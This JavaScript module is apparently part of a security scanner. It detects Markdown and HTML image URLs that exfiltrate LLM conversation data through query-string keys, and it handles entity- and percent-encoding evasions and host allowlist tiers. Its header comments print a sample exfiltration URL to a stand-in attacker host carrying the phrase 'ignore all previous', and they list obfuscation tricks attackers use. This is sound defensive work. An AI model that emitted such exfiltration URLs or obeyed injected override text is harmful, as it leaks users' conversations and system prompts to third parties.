/**
 * S4: Markdown image URL exfiltration detection.
 *
 * Attack model: an LLM-rendered Markdown document contains an image whose URL
 * carries data-exfiltration parameters, e.g.
 *
 *   ![cute cat](http://attacker.example/log?prompt=ignore+all+previous)
 *
 * When the rendered image is fetched by the client (or by a tool acting on
 * the model's behalf), the conversation context or system prompt rides along
 * inside the URL's query string. This module flags those URLs by inspecting
 * the *key names* only — never the values — so legitimate signed URLs
 * (Firebase, S3 X-Amz-*, Discord CDN, etc.) stay safe.
 *
 * Inputs scanned:
 *   - inline images:    ![alt](url "title")
 *   - reference images: ![alt][id]   with [id]: url
 *   - HTML <img>:       <img src="url"> / <img src='url'>
 *
 * v1.13.0 entity-decoded HTML src (html-img path ONLY):
 *   Browsers entity-decode HTML attribute values BEFORE fetching them, so an
 *   attacker who controls a token like `&quot;http://attacker.example/?…&quot;`
 *   or `?a=A&amp;b=B` inside rendered HTML still successfully exfiltrates.
 *   We mirror that browser behaviour by running a *minimal* entity decoder
 *   over the raw src token before classifyUrl(). Scope:
 *     - applied to RE_HTML_IMG matches only.
 *     - decoder supports: &quot; &apos; &amp; &lt; &gt; + numeric &#NN; / &#xHH;
 *       (no generic HTML entities library — keeps bundle tight and surface
 *       under R12 control).
 *     - inline `![alt](url)` and reference-image paths are NOT entity-decoded:
 *       CommonMark does not decode entities inside URLs in parens, and benign
 *       markdown freely contains `&amp;` in alt-text / titles. Adding decode
 *       there would regress benign corpora.
 *     - bracket contract (R13): position+matchLen still anchors on the RAW
 *       (entity-encoded) src token in `content`, NOT on the decoded URL.
 *       slice(position, position+matchLen) returns the raw token verbatim.
 *     - meta.entityDecoded === true is the only new meta field — added so the
 *       UI detail row can show the user that the displayed src was decoded.
 *
 * v1.15.0 percent-decoded URL pre-pass (ALL 3 paths):
 *   Browsers and WHATWG URL parsers treat percent-encoded reserved characters
 *   in the path/query as literal bytes — but the URLSearchParams key tokenizer
 *   only splits on the literal `&` / `=` chars and matches keys verbatim. An
 *   attacker who writes `?%70rompt=PAYLOAD` (or `?a=A%26prompt=B`) hides the
 *   strong key `prompt` from our STRONG_KEYS lookup even though the browser
 *   fetches the URL and the server sees the obfuscated query just fine.
 *   classifyUrl() now runs a minimal percent-decoder over the URL string when
 *   the raw form misses, restricted to the 6 reserved chars that matter for
 *   key tokenization (%2F /, %3F ?, %26 &, %3D =, %23 #, %20 space).
 *     - applied at the classifyUrl() entry, so all 3 image shapes (inline,
 *       ref, html-img) benefit uniformly. This is logically correct because
 *       browsers do not surface percent-encoding to the URL parser layer —
 *       it's a transport-level encoding that the URI spec mandates decoding
 *       before query-key tokenization.
 *     - decoder is allowlist-only (NOT decodeURIComponent): `%25` is
 *       deliberately NOT decoded to prevent double-decode bypasses. Arbitrary
 *       UTF-8 multi-byte sequences are NOT decoded either.
 *     - bracket contract (R13): position+matchLen still anchors on the RAW
 *       URL token in `content`. finding.content echoes the raw (percent-
 *       encoded) URL verbatim.
 *     - meta.percentDecoded === true marks the path. Composable with
 *       entityDecoded on the html-img path (both flags can be true for the
 *       `&quot;…%70rompt…&quot;` double-obfuscation shape).
 *     - host-tier (R20) judgment is identical raw vs decoded: hostname is
 *       not percent-encode target (URL parser IDNA-normalizes), and isSafeHost
 *       / isIpLiteral / isPrivateOrLoopback short-circuits still apply on the
 *       decoded URL's hostname (which equals the raw URL's hostname).
 *
 * Severity (v1.19.0 — host-tier matrix, Tier 6 'trusted-allowlist' added):
 *   - safeHost (imageOnlyHosts suffix
 *     OR userContentHosts exact)      -> short-circuit, no finding
 *   - data: / mailto: / javascript:   -> skip
 *   - non-http(s) / parse error       -> skip
 *   - trusted-allowlist host
 *     (TRUSTED_HOSTS suffix match —
 *      organisation-controlled DNS):
 *       strong >= 1                   -> warning (md-exfil-allowlist-downgraded,
 *                                       meta.originalSeverity='danger')
 *       weak   >= 1                   -> info    (md-exfil-allowlist-suppressed,
 *                                       meta.suppressedByAllowlist=true —
 *                                       NOT counted in summary danger/warning)
 *   - unknown host (incl. subdomain
 *     of userContentHost):
 *       strong >= 1                   -> danger (strong key)
 *       weak   >= 1                   -> warning (weak key)   [v1.9.0: was weak>=2]
 *   - public IP literal host:
 *       strong >= 1                   -> danger (public IP host)
 *       weak   >= 1                   -> warning (public IP host)
 *   - private/loopback IP literal:
 *       strong >= 1                   -> warning (private IP host)
 *       weak   only                   -> skip (silent on benign baseline)
 *
 * The TRUSTED_HOSTS list is extensible at runtime via TRUSTED_HOSTS_EXTRA env
 * var (comma-separated, host-only). Process-env access is gated behind a try
 * so the browser bundle continues to work with the builtin list only.
 *
 * Returned finding shape:
 *   {
 *     element:  'md-image' | 'md-image-ref' | 'html-img',
 *     technique: short human-readable description,
 *     content:  the URL itself (escaped, <=300 chars),
 *     position: UTF-16 offset of the URL inside `content`,
 *     matchLen: URL length in UTF-16 code units,
 *     severity: 'danger' | 'warning',
 *   }
 *
 * R12 (Critical): only the URL itself is echoed back. Decoded shadow strings
 * never appear in the response body.
 */

import { escapeForDisplay, loadRule } from "./utils.js";

const RULE = loadRule("exfil-patterns.json");
const STRONG_KEYS = new Set(RULE.strongKeys.map((s) => s.toLowerCase()));
const WEAK_KEYS = new Set(RULE.weakKeys.map((s) => s.toLowerCase()));
// Two-tier host allowlist (Bug #3 fix).
//   imageOnlyHosts: dedicated CDN / image hosts. Suffix-match allowed because
//     a subdomain of `cdn.jsdelivr.net` is still a jsDelivr-served asset.
//   userContentHosts: user-content sites where ANY visitor can register an
//     account and host a file (notion.so) OR where the bucket name is part
//     of the hostname (`<bucket>.storage.googleapis.com`,
//     `<attacker>.googleusercontent.com`). EXACT-host match only —
//     subdomain-level allowlisting on these would let attacker subdomains
//     short-circuit the safety check, which was the original FN.
//
//   Note: `googleusercontent.com`, `storage.googleapis.com`,
//   `firebasestorage.googleapis.com` are DELIBERATELY in NEITHER list:
//   any subdomain is attacker-controllable and even the bare 2LDs are
//   user-content stores. Strong key on those should still flag as danger.
const IMAGE_ONLY_HOSTS = (RULE.imageOnlyHosts || []).map((s) => s.toLowerCase());
const USER_CONTENT_HOSTS = new Set(
  (RULE.userContentHosts || []).map((s) => s.toLowerCase())
);
// Back-compat: if a legacy rules file still ships `safeHosts`, treat each as
// an exact-only host (the safer default). We don't suffix-match legacy entries
// because that was the FN we're fixing.
const LEGACY_SAFE_HOSTS = new Set(
  (RULE.safeHosts || []).map((s) => s.toLowerCase())
);

// --- helpers ------------------------------------------------------------

// v1.13.0: minimal HTML-entity decoder for the html-img src pre-pass.
// Scope: 5 named entities (browsers decode these inside attribute values
// before fetching) + 2 numeric forms (decimal `&#NN;` / hex `&#xHH;`). We
// deliberately do NOT pull in a generic entities library — the realistic
// attacker permutations are covered by this minimal set, and a broader
// surface would risk over-decoding inside benign rendered HTML.
//
// Performance: caller short-circuits if the raw token contains no `&`, so
// this function is only invoked when entities are actually present.
const ENTITY_NAMED = {
  quot: '"',
  apos: "'",
  amp: "&",
  lt: "<",
  gt: ">",
};
function decodeBasicHtmlEntities(s) {
  return s.replace(/&(?:(quot|apos|amp|lt|gt)|#(\d+)|#[xX]([0-9a-fA-F]+));/g, (_, name, dec, hex) => {
    if (name) return ENTITY_NAMED[name];
    if (dec) {
      const cp = Number(dec);
      if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) return _;
      try { return String.fromCodePoint(cp); } catch { return _; }
    }
    if (hex) {
      const cp = parseInt(hex, 16);
      if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) return _;
      try { return String.fromCodePoint(cp); } catch { return _; }
    }
    return _;
  });
}

// Strip a single leading + trailing matched quote character (`"` / `'`) from
// the decoded src, if and only if the decoded form starts and ends with the
// same quote char. This handles the `&quot;https://...&quot;` shape where the
// quotes themselves were entity-encoded so RE_HTML_IMG captured them as part
// of the bare-src token.
function stripDecodedSurroundingQuotes(s) {
  if (s.length < 2) return s;
  const first = s.charCodeAt(0);
  const last = s.charCodeAt(s.length - 1);
  // 0x22 = ", 0x27 = '
  if ((first === 0x22 || first === 0x27) && first === last) {
    return s.slice(1, -1);
  }
  return s;
}

// v1.15.0: minimal percent-decoder for the classifyUrl() pre-pass.
//
// Scope (allowlist — only the reserved chars that influence URL query-key
// tokenization in the WHATWG URL parser):
//   %2F / %2f -> '/'   (path separator hiding)
//   %3F / %3f -> '?'   (query start hiding)
//   %26       -> '&'   (query separator hiding — turns ?a=A%26prompt=B
//                       into ?a=A&prompt=B, exposing the prompt sub-key)
//   %3D / %3d -> '='   (key/value separator hiding)
//   %23       -> '#'   (fragment marker)
//   %20       -> ' '   (space — consistent with URI spec)
//
// EXCLUDED (intentional):
//   - %25 ('%')              — DO NOT decode. Enables double-decode bypass
//                              (`%2525prompt` -> `%25prompt` -> `%prompt`).
//                              Keep single-pass and idempotent.
//   - Arbitrary %XX           — full decodeURIComponent is too broad and would
//                              decode UTF-8 multi-byte sequences inside query
//                              VALUES (R12 surface risk).
//   - %00 / control chars    — skip; don't help key matching and may break
//                              `new URL()` downstream.
//
// Regex matches ONLY the allowlisted bytes, so unknown %-sequences are not
// even touched. PERCENT_MAP `?? m` is belt-and-suspenders.
//
// R12 (raw token contract): minimalPercentDecode's output is ONLY consumed by
// classifyUrlImpl for re-classification — it never reaches finding.content,
// finding.matchLen, finding.position, or priority.js#labelFor. Mirrors the
// v1.13.0 entity-decode pattern.
//
// Cost: caller short-circuits if `%` is absent in the raw URL, so this
// function is O(n) only on URLs that actually contain `%`.
const PERCENT_MAP = {
  "%2F": "/", "%2f": "/",
  "%3F": "?", "%3f": "?",
  "%26": "&",
  "%3D": "=", "%3d": "=",
  "%23": "#",
  "%20": " ",
};
// Tight allowlist regex — ONLY the 6 reserved chars relevant to query-key
// tokenization. Unknown %-sequences are not matched (and therefore not
// touched). The PERCENT_MAP `?? m` fallback is belt-and-suspenders.
//   %2[0Ff] -> %20 / %2F / %2f
//   %26     -> %26
//   %3[DdFf]-> %3D / %3d / %3F / %3f
//   %23     -> %23
const RE_PCT_ALLOWLIST = /%(?:2[0Ff]|26|3[DdFf]|23)/g;

function minimalPercentDecode(s) {
  if (!s.includes("%")) return s;
  return s.replace(RE_PCT_ALLOWLIST, (m) => PERCENT_MAP[m] ?? m);
}

function isSafeHost(hostname) {
  if (!hostname) return false;
  const h = hostname.toLowerCase();
  // Tier 1: dedicated image/CDN hosts — exact OR suffix.
  for (const safe of IMAGE_ONLY_HOSTS) {
    if (h === safe || h.endsWith("." + safe)) return true;
  }
  // Tier 2: user-content sites — EXACT only.
  if (USER_CONTENT_HOSTS.has(h)) return true;
  // Tier 3 (back-compat): legacy `safeHosts` entries are exact-only too.
  if (LEGACY_SAFE_HOSTS.has(h)) return true;
  return false;
}

// v1.19.0 Tier 6 — trusted-allowlist.
//
// Curated list of well-known operational hosts (analytics, CDN-as-a-service,
// payment / auth / SaaS APIs, package registries, official cloud storage
// public buckets, etc.). These hosts ARE NOT image hosts in the strict sense
// (so they don't qualify for the imageOnlyHosts tier-1 short-circuit), but
// they DO accept inbound traffic from any LLM-rendered document in the wild
// and the FP-pressure on weak-key heuristics is large enough to warrant a
// dedicated suppress/downgrade tier.
//
// Suffix-matching semantics (like tier-1 imageOnlyHosts): any subdomain of a
// listed host counts. This is safe because every entry below is operated by
// the listed organisation — subdomain takeover would require compromising
// the organisation's DNS itself.
//
// EXACTLY-matched entries (no subdomain) are also covered by the same
// `h === t || h.endsWith("." + t)` check.
//
// Severity contract (see classifyHostTier + classifyUrlImpl downstream):
//   - weak-key-only on trusted-allowlist  -> suppress (severity 'info',
//                                            does not count toward
//                                            danger/warning summary)
//   - strong-key on trusted-allowlist     -> downgrade ONE step
//                                            (danger -> warning)
//   - IP literal still wins (we never reach the trusted-allowlist branch
//     for IP literals because isIpLiteral short-circuits earlier).
//
// Extensible at runtime via TRUSTED_HOSTS_EXTRA env var (comma-separated,
// host-only — no scheme, no path). Process-env access is gated through a
// `try` so this still works in environments where `process` is undefined
// (browser bundle).
// IMPORTANT subdomain-takeover policy (mirrors the userContentHosts comment
// in exfil-patterns.json): bare 2LDs where ANY visitor can create a bucket
// / app / page on a *.example.com subdomain MUST NOT be on this list. That
// includes googleusercontent.com / *.storage.googleapis.com / *.amazonaws.com
// / *.appspot.com / *.cloudfront.net / *.vercel.app / *.netlify.app /
// *.azureedge.net / *.blob.core.windows.net / *.fastly.net / *.b-cdn.net.
// Suffix-matching is INTENDED on this list (subdomain == still the listed
// organisation's DNS), so anything that lets a third party stand up an
// attacker subdomain breaks the safety contract — see safehost-subdomain-
// bypass.test.js which explicitly asserts these stay at 'danger'.
const TRUSTED_HOSTS_BUILTIN = [
  // Analytics / marketing pixels (organisation-controlled DNS)
  "google-analytics.com",
  "googletagmanager.com",
  "analytics.google.com",
  "stats.g.doubleclick.net",
  "doubleclick.net",
  "mixpanel.com",
  "segment.io",
  "segment.com",
  "amplitude.com",
  "hotjar.com",
  "hubspot.com",
  "klaviyo.com",
  "marketo.com",
  "bing.com",
  "fbcdn.net",
  // Payment / auth / SaaS APIs
  "stripe.com",
  "auth0.com",
  "okta.com",
  "twilio.com",
  "sendgrid.net",
  "mailgun.org",
  "postmarkapp.com",
  "intercom.com",
  "intercomcdn.com",
  "zendesk.com",
  "salesforce.com",
  "atlassian.com",
  // jsdelivr.net / unpkg.com are operated by the project itself (no subdomain
  // takeover possible). The .net / .com TLD entries here are organisation-
  // operated and don't carry per-customer subdomain stand-up.
  "jsdelivr.net",
  "unpkg.com",
  "cdnjs.cloudflare.com",
  "imagekit.io",
  "imgix.net",
  "cloudinary.com",
  // GitHub static-asset CDN (NOT githubusercontent.com — that's user content)
  "githubassets.com",
  // Package registries
  "npmjs.com",
  "pypi.org",
  "rubygems.org",
  "crates.io",
  "packagist.org",
  // Avatar / gravatar (org-operated)
  "gravatar.com",
  // Microsoft / Office (org-operated; *.live.com is sign-in family, not
  // arbitrary user-controlled subdomains. blob.core.windows.net /
  // azureedge.net are deliberately EXCLUDED — those are customer-bucket
  // namespaces.)
  "office.com",
  "office.net",
  "outlook.com",
  // Vimeo (vimeocdn.com is org-operated; vimeo.com is the main marketing
  // domain. NOT including video-host subdomains because those are
  // user-uploaded content.)
  "vimeocdn.com",
];

function parseTrustedHostsExtra() {
  try {
    if (typeof process !== "undefined" && process && process.env) {
      const raw = process.env.TRUSTED_HOSTS_EXTRA;
      if (typeof raw === "string" && raw.length > 0) {
        return raw
          .split(",")
          .map((s) => s.trim().toLowerCase())
          .filter((s) => s.length > 0 && /^[a-z0-9.\-]+$/.test(s));
      }
    }
  } catch {
    // Browser bundle or sandboxed env — silently fall back to builtin only.
  }
  return [];
}

const TRUSTED_HOSTS = TRUSTED_HOSTS_BUILTIN.map((s) => s.toLowerCase()).concat(
  parseTrustedHostsExtra()
);

function isTrustedAllowlistHost(hostname) {
  if (!hostname) return false;
  const h = hostname.toLowerCase();
  for (const t of TRUSTED_HOSTS) {
    if (h === t || h.endsWith("." + t)) return true;
  }
  return false;
}

/**
 * Classify the host into one of the six tiers (v1.19.0). Exposed for tests
 * and for future detectors that may want the same tiering signal.
 *
 * Tier order (FIRST match wins — caller treats them as a disjoint partition):
 *   1. 'image-only'        — imageOnlyHosts suffix / userContentHosts exact
 *                            (collapsed: caller never branches between them)
 *                            [short-circuit SAFE]
 *   2. 'ip-literal-private'— RFC1918 / loopback / link-local
 *   3. 'ip-literal-public' — any other IPv4/IPv6 literal
 *   4. 'trusted-allowlist' — TRUSTED_HOSTS suffix match     [suppress/downgrade]
 *   5. 'unknown'           — everything else                [normal severity]
 *
 * R12: the returned string is a fixed enum value, not an attacker-controlled
 * host or key, so it's safe to surface via `meta.hostTier`.
 */
export function classifyHostTier(hostname) {
  if (!hostname) return "unknown";
  if (isSafeHost(hostname)) return "image-only";
  if (isIpLiteral(hostname)) {
    if (isPrivateOrLoopback(hostname)) return "ip-literal-private";
    return "ip-literal-public";
  }
  if (isTrustedAllowlistHost(hostname)) return "trusted-allowlist";
  return "unknown";
}

// IPv4 dotted quad
const IPV4_RE = /^(?:\d{1,3}\.){3}\d{1,3}$/;

function isIPv4(hostname) {
  if (!IPV4_RE.test(hostname)) return false;
  return hostname.split(".").every((n) => {
    const v = Number(n);
    return Number.isInteger(v) && v >= 0 && v <= 255;
  });
}

function isIPv6Literal(hostname) {
  // WHATWG URL keeps brackets on hostname for IPv6 literals (e.g. "[::1]").
  // Strip any leading `[` / trailing `]` before testing so a host of "[::1]"
  // is recognised as a v6 literal. We detect at least one colon and only
  // hex/colon/dot (for v4-mapped tail).
  if (!hostname.includes(":")) return false;
  const bare = hostname.replace(/^\[|\]$/g, "");
  return /^[0-9a-fA-F:.]+$/.test(bare);
}

function isPrivateIPv4(hostname) {
  if (!isIPv4(hostname)) return false;
  const [a, b] = hostname.split(".").map(Number);
  if (a === 10) return true;
  if (a === 127) return true; // loopback
  if (a === 0) return true;
  if (a === 169 && b === 254) return true; // link-local
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  return false;
}

function stripV6Brackets(hostname) {
  return hostname.replace(/^\[|\]$/g, "");
}

function isLoopbackIPv6(hostname) {
  // ::1 in any compact form. Strip brackets first since WHATWG URL keeps them.
  const bare = stripV6Brackets(hostname);
  return bare === "::1" || bare === "0:0:0:0:0:0:0:1";
}

function isPrivateIPv6(hostname) {
  if (!isIPv6Literal(hostname)) return false;
  if (isLoopbackIPv6(hostname)) return true;
  const h = stripV6Brackets(hostname).toLowerCase();
  // fc00::/7 unique local, fe80::/10 link-local
  if (h.startsWith("fc") || h.startsWith("fd")) return true;
  if (h.startsWith("fe80:") || h.startsWith("fe8") || h.startsWith("fe9") || h.startsWith("fea") || h.startsWith("feb")) return true;
  return false;
}

function isPrivateOrLoopback(hostname) {
  if (isPrivateIPv4(hostname)) return true;
  if (isPrivateIPv6(hostname)) return true;
  if (hostname === "localhost") return true;
  return false;
}

function isIpLiteral(hostname) {
  return isIPv4(hostname) || isIPv6Literal(hostname);
}

/**
 * Parse the URL's query string and classify keys.
 * Returns { strong: number, weak: number, sampleKey: string|null }.
 *
 * sampleKey is whichever strong key fired first (for the technique label) or,
 * absent that, the first weak key that fired.
 */
function classifyQueryKeys(urlObj) {
  let strong = 0;
  let weak = 0;
  let sampleStrong = null;
  let sampleWeak = null;
  for (const [rawKey] of urlObj.searchParams.entries()) {
    const key = rawKey.toLowerCase();
    if (STRONG_KEYS.has(key)) {
      strong++;
      if (sampleStrong === null) sampleStrong = key;
    } else if (WEAK_KEYS.has(key)) {
      weak++;
      if (sampleWeak === null) sampleWeak = key;
    }
  }
  return { strong, weak, sampleStrong, sampleWeak };
}

/**
 * Internal URL classifier (v1.15.0 refactor).
 *
 * Pure function: takes a URL string (raw OR percent-decoded form), returns
 * { severity, technique, meta } or null. No side effects, no I/O.
 *
 * R12: `technique` is a FIXED detector-controlled phrase — no attacker-
 * controlled host or query-key name is interpolated into it (those would
 * leak into `topFindings[].label` via priority.js#labelFor). Variable data
 * is split into `meta: { host, ipKind, matchedKey }` so UIs can still
 * display the specifics on the detail row without exposing them in the
 * summary banner.
 *
 * Called by classifyUrl() which adds the percent-decode 2-pass shell.
 */
function classifyUrlImpl(rawUrl) {
  // Skip non-http(s) schemes early.
  const lower = rawUrl.trimStart().toLowerCase();
  if (
    lower.startsWith("data:") ||
    lower.startsWith("mailto:") ||
    lower.startsWith("javascript:") ||
    lower.startsWith("vbscript:") ||
    lower.startsWith("file:")
  ) {
    return null;
  }

  let urlObj;
  try {
    urlObj = new URL(rawUrl);
  } catch {
    return null;
  }
  const proto = urlObj.protocol.toLowerCase();
  if (proto !== "http:" && proto !== "https:") return null;

  const host = urlObj.hostname;
  if (!host) return null;

  // WHATWG URL keeps the brackets on IPv6 literal hostnames ("[::1]"). Strip
  // them once so every downstream check sees the bare host literal.
  const cleanHost = host.replace(/^\[|\]$/g, "");

  // R: short-circuit on safe host — nothing the path/query says matters here.
  if (isSafeHost(cleanHost)) return null;

  const { strong, weak, sampleStrong, sampleWeak } = classifyQueryKeys(urlObj);

  // v1.19.0 Tier 6 — trusted-allowlist. Evaluated BEFORE IP-literal logic so
  // an IP literal (which is never on the trusted-allowlist) still flows to
  // the public/private branch unchanged. Trusted-allowlist hosts are
  // suffix-matched (subdomains of organisation-controlled DNS).
  //
  // Behaviour:
  //   - weak >= 1 && strong === 0  -> info-severity audit log
  //                                   ('md-exfil-allowlist-suppressed').
  //                                   Severity 'info' is NOT counted by
  //                                   detector.js#countBySeverity (only
  //                                   'danger'/'warning' are), so the
  //                                   warning bucket stays quiet.
  //   - strong >= 1                -> downgrade severity ONE step
  //                                   ('md-exfil-allowlist-downgraded',
  //                                   meta.originalSeverity='danger').
  //                                   Surfaces as 'warning' instead of
  //                                   'danger'. UI still sees a finding;
  //                                   the banner deserves the demotion
  //                                   because the host is operationally
  //                                   trusted.
  //   - no strong / no weak        -> null (silent).
  //
  // R12: technique stays a FIXED detector-controlled kebab id. host /
  // matchedKey live on meta only.
  if (isTrustedAllowlistHost(cleanHost)) {
    if (strong >= 1) {
      return {
        severity: "warning",
        technique: "md-exfil-allowlist-downgraded",
        meta: {
          host: cleanHost,
          hostTier: "trusted-allowlist",
          matchedKey: sampleStrong,
          strongHits: strong,
          weakHits: weak,
          originalSeverity: "danger",
          allowlistDowngraded: true,
        },
      };
    }
    if (weak >= 1) {
      return {
        severity: "info",
        technique: "md-exfil-allowlist-suppressed",
        meta: {
          host: cleanHost,
          hostTier: "trusted-allowlist",
          matchedKey: sampleWeak,
          weakHits: weak,
          suppressedByAllowlist: true,
        },
      };
    }
    return null;
  }

  // IP literal logic.
  if (isIpLiteral(cleanHost)) {
    if (isPrivateOrLoopback(cleanHost)) {
      // Private / loopback IP host (10.x / 172.16-31.x / 192.168.x / 127.x /
      // ::1 / fc00::/7 / fe80::/10 / localhost).
      // v1.9.0: strong-key still warns (internal webhook to attacker-shaped
      // endpoint), but a lone weak key on private space is too noisy
      // (legitimate dev / staging webhooks routinely carry ?session= /
      // ?data= etc) — stay silent and let other detectors handle.
      if (strong >= 1) {
        return {
          severity: "warning",
          technique: "Markdown image exfiltration (private IP host)",
          meta: { host: cleanHost, ipKind: "private", matchedKey: sampleStrong },
        };
      }
      return null;
    }
    // Public IP literal: image URLs in legit docs basically never point at
    // raw public IPs, so a lone weak key is enough to warrant a warning.
    // Strong keys still escalate to danger.
    if (strong >= 1) {
      return {
        severity: "danger",
        technique: "Markdown image exfiltration (public IP host)",
        meta: { host: cleanHost, ipKind: "public", matchedKey: sampleStrong },
      };
    }
    if (weak >= 1) {
      return {
        severity: "warning",
        technique: "Markdown image exfiltration (public IP host)",
        meta: { host: cleanHost, ipKind: "public", matchedKey: sampleWeak, weakHits: weak },
      };
    }
    return null;
  }

  // Regular hostname path (host is NOT in any allowlist tier — includes raw
  // unknown hosts as well as subdomains of userContentHosts which are EXACT-
  // only, e.g. `attacker.notion.so`).
  // v1.9.0: weak threshold relaxed from >=2 to >=1. Benign image hosts that
  // legitimately carry weak query keys (analytics, signed CDN URLs, etc)
  // remain protected by the upstream `isSafeHost` short-circuit on
  // imageOnlyHosts / userContentHosts.
  if (strong >= 1) {
    return {
      severity: "danger",
      technique: "Markdown image exfiltration (strong key)",
      meta: { host: cleanHost, matchedKey: sampleStrong, strongHits: strong, weakHits: weak },
    };
  }
  if (weak >= 1) {
    return {
      severity: "warning",
      technique: "Markdown image exfiltration (weak key)",
      meta: { host: cleanHost, matchedKey: sampleWeak, weakHits: weak },
    };
  }
  return null;
}

/**
 * Classify a URL via the v1.15.0 percent-decode 2-pass pre-shell.
 *
 *   1. Try classifyUrlImpl(rawUrl) — fast path. Hit returns the verdict as-is
 *      (meta.percentDecoded is intentionally absent).
 *   2. On miss, if rawUrl has no `%` char, return null (zero-cost skip for
 *      the benign-URL common case).
 *   3. Otherwise minimalPercentDecode(rawUrl) -> decoded. If decoded equals
 *      rawUrl (allowlist found no targets), return null.
 *   4. Try classifyUrlImpl(decoded). On hit, merge {percentDecoded: true}
 *      into the verdict's meta and return.
 *
 * Composability:
 *   - All 3 image shapes (inline, ref, html-img) call this same wrapper, so
 *     the percent-decode pass applies uniformly.
 *   - The html-img path additionally wraps THIS function with its own
 *     entity-decode 2-pass (raw -> entity-decoded). Both 2-passes compose:
 *     a `<img src=&quot;…%70rompt…&quot;>` shape hits the entity-decoded
 *     percent-decoded form and yields meta { entityDecoded: true,
 *     percentDecoded: true }.
 *
 * R12: minimalPercentDecode's output never reaches finding.content or
 * finding.technique — it only feeds classifyUrlImpl's `new URL()` parser.
 * Bracket contract: position+matchLen still anchors on the raw URL token
 * upstream in detectMarkdownExfil(), and buildFinding(rawUrl, ...) writes
 * the raw URL to finding.content.
 */
function classifyUrl(rawUrl) {
  // 1. Fast path — raw URL classification.
  const rawVerdict = classifyUrlImpl(rawUrl);
  if (rawVerdict) return rawVerdict;

  // 2. Zero-cost skip on the common case (no percent-encoding).
  if (!rawUrl.includes("%")) return null;

  // 3. Decode the allowlisted reserved chars; bail if no-op.
  const decoded = minimalPercentDecode(rawUrl);
  if (decoded === rawUrl) return null;

  // 4. Re-classify on the decoded form; mark the path on hit.
  const decodedVerdict = classifyUrlImpl(decoded);
  if (!decodedVerdict) return null;

  // R12: only a boolean flag — never the decoded URL string.
  return {
    ...decodedVerdict,
    meta: { ...(decodedVerdict.meta || {}), percentDecoded: true },
  };
}

function buildFinding(element, urlStr, position, severity, technique, meta) {
  const f = {
    element,
    technique,
    content: escapeForDisplay(urlStr.slice(0, 300)),
    position,
    matchLen: urlStr.length,
    severity,
  };
  // R12: `technique` stays fixed-phrase; `meta` carries the host / key name so
  // the UI can show them in the detail row but NOT in the banner label
  // (priority.js#labelFor never reads `meta`).
  if (meta && typeof meta === "object") f.meta = meta;
  return f;
}

// --- markdown regex set ------------------------------------------------
//
// All use the `d` (indices) flag so we can grab the *URL* span — not just the
// whole match — and map it back to the original-text offset. Group order is
// fixed across these regexes so we can index by name.

// ![alt](url "title")
//   alt = group 1  (may be empty)
//   url = group 2
const RE_INLINE_IMG = /!\[([^\]]*)\]\(\s*(\S+?)(?:\s+["'][^"']*["'])?\s*\)/gd;

// ![alt][id]
//   alt = group 1
//   id  = group 2 (case-insensitive; lowercased on lookup)
const RE_REF_IMG = /!\[([^\]]*)\]\[([^\]]+)\]/gd;

// [id]: url     (definition)
//   id  = group 1
//   url = group 2
const RE_REF_DEF = /^\s*\[([^\]]+)\]:\s*(\S+)/gmd;

// <img src="url"> / <img src='url'> / <img ... src=url ...>
//   url = group 1 (without surrounding quotes)
const RE_HTML_IMG = /<img\b[^>]*?\bsrc\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s>'"]+))[^>]*>/gid;

// --- exported -----------------------------------------------------------

/**
 * S4 detector entry point.
 *
 * @param {string} content - Raw markdown or markdown-with-HTML text.
 * @returns {Array} findings (see file header for shape).
 */
export function detectMarkdownExfil(content) {
  if (!content || typeof content !== "string") return [];

  const findings = [];

  // ---- Pass 1: collect reference-image definitions ([id]: url) ----
  // Lowercased id -> { url, urlStart }. Per CommonMark, IDs are
  // case-insensitive. We capture the URL group's start offset (m.indices[2][0])
  // so the downstream ref-image finding can point `position` at the URL inside
  // the *definition line*, keeping the (position, matchLen=url.length) bracket
  // contract intact — slice(position, position+matchLen) === url.
  const refDefs = new Map();
  for (const m of content.matchAll(RE_REF_DEF)) {
    if (!m.indices || !m.indices[2]) continue;
    const id = (m[1] || "").trim().toLowerCase();
    const rawUrl = m[2] || "";
    const url = rawUrl.trim();
    if (!id || !url) continue;
    // The captured group includes the raw URL token; if the author wrote
    // leading whitespace inside the group it would have been excluded by \S+,
    // so urlStart maps directly to the URL's first character in `content`.
    const urlStart = m.indices[2][0];
    refDefs.set(id, { url, urlStart });
  }

  // ---- Pass 2: inline images ![alt](url) ----
  for (const m of content.matchAll(RE_INLINE_IMG)) {
    // m.indices is enabled via /d flag.
    if (!m.indices || !m.indices[2]) continue;
    const url = m[2];
    const [urlStart] = m.indices[2];
    const verdict = classifyUrl(url);
    if (!verdict) continue;
    findings.push(
      buildFinding("md-image", url, urlStart, verdict.severity, verdict.technique, verdict.meta)
    );
  }

  // ---- Pass 3: reference images ![alt][id] (resolved via refDefs) ----
  for (const m of content.matchAll(RE_REF_IMG)) {
    if (!m.indices) continue;
    const id = (m[2] || "").trim().toLowerCase();
    const refDef = refDefs.get(id);
    if (!refDef) continue;
    const { url, urlStart } = refDef;
    const verdict = classifyUrl(url);
    if (!verdict) continue;
    // Position points at the URL inside the *reference definition line*
    // (e.g. `[catref]: https://attacker.example/?p=PAYLOAD`), NOT at the
    // `![alt][id]` use-site. Reason: the (position, matchLen=url.length)
    // contract guarantees `content.slice(position, position+matchLen) === url`,
    // and the use-site span (`![alt][id]`) has a different length than the
    // resolved URL, so anchoring there would violate the bracket invariant.
    // The URL definition line is still the actionable surface for redaction.
    findings.push(
      buildFinding(
        "md-image-ref",
        url,
        urlStart,
        verdict.severity,
        verdict.technique,
        verdict.meta
      )
    );
  }

  // ---- Pass 4: <img src="..."> ----
  // v1.13.0: entity-decode the captured src before classifying. Browsers
  // entity-decode HTML attribute values before fetching, so an attacker can
  // hide a URL behind `&quot;…&quot;` or hide `&` query separators behind
  // `&amp;` and still successfully exfiltrate. We mirror that by:
  //   1. Try the raw token first (fast path — only decode if `&` is present).
  //   2. If raw classifies, emit the finding with the raw url verbatim.
  //   3. Otherwise, if a decoded form differs from raw and parses, classify
  //      that decoded form and (if it produces a finding) emit it with
  //      meta.entityDecoded=true and matchLen anchored on the RAW token span.
  // Bracket contract (R13): position+matchLen always anchors on the RAW src
  // token in `content`, NEVER on the decoded URL.
  for (const m of content.matchAll(RE_HTML_IMG)) {
    if (!m.indices) continue;
